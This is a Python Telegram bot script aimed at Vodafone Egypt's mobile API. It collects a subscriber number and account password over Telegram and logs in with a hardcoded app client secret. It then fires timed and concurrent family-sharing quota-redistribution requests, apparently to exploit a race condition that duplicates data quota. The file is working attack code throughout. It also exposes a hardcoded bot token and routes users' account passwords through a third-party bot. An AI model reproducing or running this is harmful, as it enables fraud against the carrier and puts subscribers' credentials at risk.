import requests
import time
import os
from threading import Thread
import telebot

BOT_TOKEN = "8280921299:AAEwipBx0SO_DOufi8-uusAciANPEnsImnk"
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
user_state = {}
STEPS = ["number", "password_owner", "member0", "member1", "member2", "count", "q1", "q2", "tt", "confirm_run"]

def init_state(chat_id):
    user_state[chat_id] = {"step_index": 0, "data": {}}

def get_step_prompt(step):
    prompts = {
        "number": "📱 أدخل رقم فودافون:",
        "password_owner": "🔑 أدخل كلمة مرور الحساب:",
        "member0": "👤 member0:",
        "member1": "👤 member1:",
        "member2": "👤 member2:",
        "count": "Enter count :",
        "q1": "q1:",
        "q2": "q2:",
        "tt": "time:",
        "confirm_run": "هل تريد تشغيل البوت الآن؟ اكتب Y للتأكيد أو N للإلغاء"
    }
    return prompts.get(step, "أدخل القيمة:")

def get_access_token(session, number, password_owner, chat_sender):
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    payload = {
        'grant_type': "password",
        'username': number,
        'password': password_owner,
        'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        'client_id': "ana-vodafone-app"
    }
    headers = {
        'User-Agent': "okhttp/4.11.0",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'silentLogin': "false",
        'x-agent-operatingsystem': "13",
        'clientId': "AnaVodafoneAndroid",
        'Accept-Language': "ar",
        'x-agent-device': "Xiaomi 21061119AG",
        'x-agent-version': "2024.12.1",
        'x-agent-build': "946",
        'digitalId': "28RI9U7IINOOB"
    }
    max_attempts = 3
    for attempt in range(max_attempts):
        try:
            response = session.post(url, data=payload, headers=headers)
            bot.send_message(chat_sender, f"[LOGIN] Status Code: {response.status_code}")
            if response.status_code != 200:
                bot.send_message(chat_sender, f"[LOGIN] الرد كامل غير JSON أو خطأ، محاولة {attempt+1} فشلت")
                time.sleep(5)
                continue
            data = response.json()
            tok = data.get('access_token')
            if not tok:
                bot.send_message(chat_sender, "Error: No access token found in response")
                time.sleep(5)
                continue
            bot.send_message(chat_sender, "تم تسجيل الدخول بنجاح!")
            return tok
        except Exception as e:
            bot.send_message(chat_sender, f"خطأ أثناء تسجيل الدخول: {e}")
            time.sleep(5)
    raise Exception("تسجيل الدخول فشل تمامًا")

def run_process(chat_id, input_data):
    try:
        number = input_data["number"]
        password_owner = input_data["password_owner"]
        member0 = input_data["member0"]
        member1 = input_data["member1"]
        member2 = input_data["member2"]
        name = "ISLAM"
        count = int(input_data["count"])
        q1 = int(input_data["q1"])
        q2 = int(input_data["q2"])
        tt = int(input_data["tt"])
        session = requests.Session()
        access_token = get_access_token(session, number, password_owner, chat_id)
        bot.send_message(chat_id, "="*55)
        head = {
            "api-host": "ProductOrderingManagement",
            "useCase": "MIProfile",
            "Authorization": f"Bearer {access_token}",
            "api-version": "v2",
            "x-agent-operatingsystem": "9",
            "clientId": "AnaVodafoneAndroid",
            "x-agent-device": "Xiaomi Redmi 6A",
            "x-agent-version": "2024.3.2",
            "x-agent-build": "592",
            "msisdn": number,
            "Accept": "application/json",
            "Accept-Language": "ar",
            "Content-Type": "application/json; charset=UTF-8",
            "Content-Length": "151",
            "Host": "mobile.vodafone.com.eg",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.11.0"
        }
        open("a1.text", "w").close()
        open("a2.text", "w").close()
        for len_ in range(count):
            try:
                for i in range(30):
                    def thread1(quota):
                        try:
                            url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
                            data = {
                                "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
                                "createdBy": {"value": "MobileApp"},
                                "parts": {
                                    "characteristicsValue": {
                                        "characteristicsValue": [{
                                            "characteristicName": "quotaDist1",
                                            "type": "percentage",
                                            "value": quota
                                        }]
                                    },
                                    "member": [
                                        {"id": [{"schemeName": "MSISDN", "value": number}], "type": "Owner"},
                                        {"id": [{"schemeName": "MSISDN", "value": member1}], "type": "Member"}
                                    ]
                                },
                                "type": "QuotaRedistribution"
                            }
                            response = session.post(url, headers=head, json=data)
                            try:
                                response_json = response.json()
                            except:
                                response_json = {}
                            if response_json == {}:
                                bot.send_message(chat_id, f"Res: 1 {response_json} 1 {quota} {[member1]}")
                                with open("a1.text", mode="w") as f:
                                    f.write(str(response_json) + str(quota))
                            else:
                                bot.send_message(chat_id, f"Response JSON: 1 {response_json}")
                        except Exception as e:
                            bot.send_message(chat_id, f"خطأ في thread1: {e}")
                    def thread2(quota):
                        try:
                            url_wap = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
                            headers = {
                                "Host": "web.vodafone.com.eg",
                                "Connection": "keep-alive",
                                "Content-Length": "449",
                                "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                                "msisdn": number,
                                "Accept-Language": "AR",
                                "sec-ch-ua-mobile": "?1",
                                "Authorization": f"Bearer {access_token}",
                                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
                                "Content-Type": "application/json",
                                "x-dtpc": "5$338036891_621h9vEAOVPAOTUAJDPRUQFKUMHFVECNFHNCFC-0e0",
                                "Accept": "application/json",
                                "clientId": "WebsiteConsumer",
                                "sec-ch-ua-platform": '"Android"',
                                "Origin": "https://web.vodafone.com.eg",
                                "Sec-Fetch-Site": "same-origin",
                                "Sec-Fetch-Mode": "cors",
                                "Sec-Fetch-Dest": "empty",
                                "Referer": "https://web.vodafone.com.eg/spa/familySharing/manageFamily",
                                "Accept-Encoding": "gzip, deflate, br, zstd"
                            }
                            payload = {
                                "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
                                "createdBy": {"value": "MobileApp"},
                                "parts": {
                                    "characteristicsValue": {
                                        "characteristicsValue": [{
                                            "characteristicName": "quotaDist1",
                                            "type": "percentage",
                                            "value": quota
                                        }]
                                    },
                                    "member": [
                                        {"id": [{"schemeName": "MSISDN", "value": number}], "type": "Owner"},
                                        {"id": [{"schemeName": "MSISDN", "value": member2}], "type": "Member"}
                                    ]
                                },
                                "type": "QuotaRedistribution"
                            }
                            response = session.post(url_wap, headers=headers, json=payload)
                            try:
                                response_json = response.json()
                            except:
                                response_json = {}
                            if response_json == {}:
                                bot.send_message(chat_id, f"Res: 2 {response_json} 2 {quota} {[member2]}")
                                with open("a2.text", mode="w") as f:
                                    f.write(str(response_json) + str(quota))
                            else:
                                bot.send_message(chat_id, f"Response JSON: 2 {response_json}")
                        except Exception as e:
                            bot.send_message(chat_id, f"خطأ في thread2: {e}")
                    time.sleep(tt)
                    thread1(q1)
                    time.sleep(tt)
                    thread2(q1)
                    time.sleep(tt)
                    Thread(target=thread1, args=(q2,)).start()
                    Thread(target=thread2, args=(q2,)).start()
                    time.sleep(3)
                    try:
                        f1 = open("a1.text", mode="r").read()
                    except:
                        f1 = ""
                    try:
                        f2 = open("a2.text", mode="r").read()
                    except:
                        f2 = ""
                    result = str(f1 + f2)
                    if result == "{}" + str(q2) + "{}" + str(q2):
                        bot.send_message(chat_id, f'{len_ + 1} successfuly')
                        break
            except Exception as e:
                bot.send_message(chat_id, f"Internet connection error: {e}")
                continue
        bot.send_message(chat_id, "انتهت العملية.")
    except Exception as e:
        bot.send_message(chat_id, f"خطأ عام: {e}")

@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    init_state(chat_id)
    bot.send_message(chat_id, get_step_prompt(STEPS[0]))

@bot.message_handler(func=lambda m: True)
def handle_all_messages(message):
    chat_id = message.chat.id
    text = message.text.strip()
    if chat_id not in user_state:
        init_state(chat_id)
        bot.send_message(chat_id, get_step_prompt(STEPS[0]))
        return
    us = user_state[chat_id]
    step_i = us["step_index"]
    current_step = STEPS[step_i]
    if current_step == "confirm_run":
        if text.upper() == "Y":
            Thread(target=run_process, args=(chat_id, us["data"])).start()
            user_state.pop(chat_id, None)
        else:
            bot.send_message(chat_id, "تم الإلغاء.")
            user_state.pop(chat_id, None)
        return
    us["data"][current_step] = text
    us["step_index"] += 1
    if us["step_index"] < len(STEPS):
        bot.send_message(chat_id, get_step_prompt(STEPS[us["step_index"]]))
    else:
        bot.send_message(chat_id, get_step_prompt("confirm_run"))

if __name__ == "__main__":
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            time.sleep(3)